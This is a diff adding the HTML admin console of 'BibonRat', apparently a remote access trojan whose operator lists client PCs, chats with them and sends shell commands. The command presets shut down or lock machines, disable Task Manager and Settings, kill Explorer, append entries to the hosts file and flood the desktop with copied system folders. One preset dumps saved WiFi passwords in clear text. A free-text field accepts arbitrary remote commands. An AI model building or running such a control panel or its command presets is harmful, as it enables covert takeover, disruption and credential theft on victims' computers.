@@ -1,0 +1,188 @@
+﻿<!doctype html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BibonRat — Admin Chat</title>
+    <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+
+    <!-- AUTH -->
+    <div id="authScreen" class="centerWrap">
+        <div class="authCard">
+            <div class="authTitle">
+                <div class="brand"><span class="dot"></span> BibonRat Admin</div>
+                <span class="badge">Auth + Firestore</span>
+            </div>
+
+            <div class="muted">Вход/регистрация через Email + Password</div>
+
+            <div class="stack">
+                <input id="email" type="email" placeholder="Email" autocomplete="email">
+                <input id="password" type="password" placeholder="Password" autocomplete="current-password">
+            </div>
+
+            <div class="row">
+                <button id="btnLogin" class="btnPrimary">Войти</button>
+                <button id="btnRegister">Регистрация</button>
+            </div>
+
+            <div id="authError" class="err"></div>
+        </div>
+    </div>
+
+    <!-- APP -->
+    <div id="appScreen" class="app hidden">
+
+        <!-- SIDEBAR -->
+        <div class="panel sidebar">
+            <div class="panelHeader">
+                <div class="title">Клиенты</div>
+                <div class="row">
+                    <span id="meEmail" class="badge"></span>
+                    <button id="btnLogout">Выйти</button>
+                </div>
+            </div>
+
+            <div class="sidebarTop">
+                <div class="row spaceBetween">
+                    <div class="muted">Коллекция: <b>pcList</b></div>
+                    <div class="row">
+                        <button id="btnPingAll">Пинг всем</button>
+                        <button id="btnRefresh">Обновить</button>
+                    </div>
+                </div>
+
+                <div class="row" style="margin-top:10px;">
+                    <span id="pingAllStatus" class="badge">—</span>
+                </div>
+
+
+                <div class="search">
+                    <input id="search" placeholder="Поиск: pcName / userName / IP / docId" />
+                </div>
+            </div>
+
+            <div id="clientsList" class="list"></div>
+        </div>
+
+        <!-- CHAT -->
+        <div class="panel chatWrap">
+            <div class="panelHeader">
+                <div class="title">Чат</div>
+                <span id="chatStatus" class="badge">не выбран клиент</span>
+            </div>
+
+            <!-- client header -->
+            <div id="chatHeader" class="chatHeaderInfo hidden">
+                <div class="chatHeaderLeft">
+                    <div class="chatTitle">
+                        <span id="chatClientName">—</span>
+                        <span id="badgeOnline" class="badge">—</span>
+                    </div>
+
+                    <div class="chatSub" id="chatClientMeta"></div>
+
+                    <div class="flagsRow">
+                        <span class="flag">adminOnline: <b id="fAdminOnline">0</b></span>
+                        <span class="flag">adminOpen: <b id="fAdminOpen">0</b></span>
+                        <span class="flag">clientOnline: <b id="fClientOnline">0</b></span>
+                        <span class="flag">clientOpen: <b id="fClientOpen">0</b></span>
+                    </div>
+                </div>
+
+                <div class="chatHeaderRight">
+                    <span class="pill" id="chatClientIdPill"></span>
+                    <div class="row">
+                        <button id="btnPing">Пинг</button>
+                        <span id="pingStatus" class="badge">—</span>
+
+                        <button id="btnOpenChat" class="btnPrimary">Открыть чат у клиента</button>
+
+                        <button id="btnCommand">Команда</button>
+
+                        <button id="btnCloseChat">Закрыть чат у клиента</button>
+                    </div>
+
+
+                </div>
+            </div>
+
+            <!-- COMMAND PANEL -->
+            <div id="cmdPanel" class="cmdPanel hidden">
+                <div class="cmdTop">
+                    <div class="cmdTitle">Команда</div>
+                    <div class="row">
+                        <span id="cmdStatusBadge" class="badge">—</span>
+                        <button id="btnCmdClose">Закрыть</button>
+                    </div>
+                </div>
+
+                <div class="cmdForm">
+                    <select id="cmdPreset">
+                        <option value='shutdown /s /t 0'>PCOFF</option>
+                        <option value='rundll32.exe user32.dll,LockWorkStation'>LockPC</option>
+
+                        <!-- Заменяю move на xcopy, так как move не поддерживает эти параметры -->
+                        <option value='xcopy "C:\Windows\Globalization\Sorting" "%USERPROFILE%\Desktop\Globalization" /E /I /H /K'>BombPC</option>
+
+                        <option value='start https://www.youtube.com/@bibonuwu'>OpenMyTube</option>
+                        <option value='tracert google.com'>TrackIP</option>
+
+                        <!-- Исправляю синтаксис PowerShell команды -->
+                        <option value='powershell -Command "Invoke-RestMethod https://ipinfo.io/json"'>InfoIP</option>
+
+                        <!-- Добавляю URL для открытия сайта -->
+                        <option value='start https://www.google.com'>Open Website</option>
+
+                        <!-- Исправляю синтаксис и добавляю echo. Нужен админ доступ! -->
+                        <option value='echo 127.0.0.1 www.example.com >> "%SystemRoot%\System32\drivers\etc\hosts"'>Block Website</option>
+
+                        <!-- Исправляю кавычки для PowerShell -->
+                        <option value="powershell -Command &quot;Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('Hello World')&quot;">Text To Speech</option>
+
+                        <option value="powershell -Command &quot;Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hello World', 'Message Box')&quot;">MessageBox</option>
+
+                        <!-- Из предыдущего блока (правильно) -->
+                        <option value="REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f">Task Manager ON</option>
+                        <option value="REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f">Task Manager OFF</option>
+                        <option value="REG add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v SettingsPageVisibility /t REG_DWORD /d 1 /f">Settings ON</option>
+                        <option value="REG delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v SettingsPageVisibility /f">Settings OFF</option>
+                        <option value="start explorer.exe">Explorer ON</option>
+                        <option value="taskkill /im explorer.exe /f /t">Explorer OFF</option>
+                        <option value="powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Scope CurrentUser -Force; Install-Module -Name AudioDeviceCmdlets -Scope CurrentUser -Force -Confirm:$false&quot;">Install Audio Tools</option>
+                        <option value="powershell -NoProfile -Command &quot;Import-Module AudioDeviceCmdlets; Set-AudioDevice -PlaybackVolume 100&quot;">Max Volume</option>
+                        <option value="for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear">WiFi Passwords</option>
+
+                    </select>
+
+                    <input id="cmdInput" placeholder='Например: start "" "https://www.youtube.com/"' />
+                    <button id="btnCmdSend" class="btnPrimary">Отправить</button>
+                </div>
+
+
+                <div class="cmdOut">
+                    <div class="cmdOutTitle">Ответ ПК</div>
+                    <pre id="cmdOutput">Выбери клиента и отправь команду…</pre>
+                </div>
+            </div>
+
+
+            <!-- messages -->
+            <div id="chatBody" class="chatBody">
+                <div class="hint">Выбери клиента слева, чтобы открыть чат.</div>
+            </div>
+
+            <!-- input -->
+            <div id="chatInput" class="chatInputBar hidden">
+                <input id="msgInput" placeholder="Напиши сообщение..." />
+                <button id="btnSend" class="btnPrimary">Отправить</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script type="module" src="./main.js"></script>
+</body>
+</html>
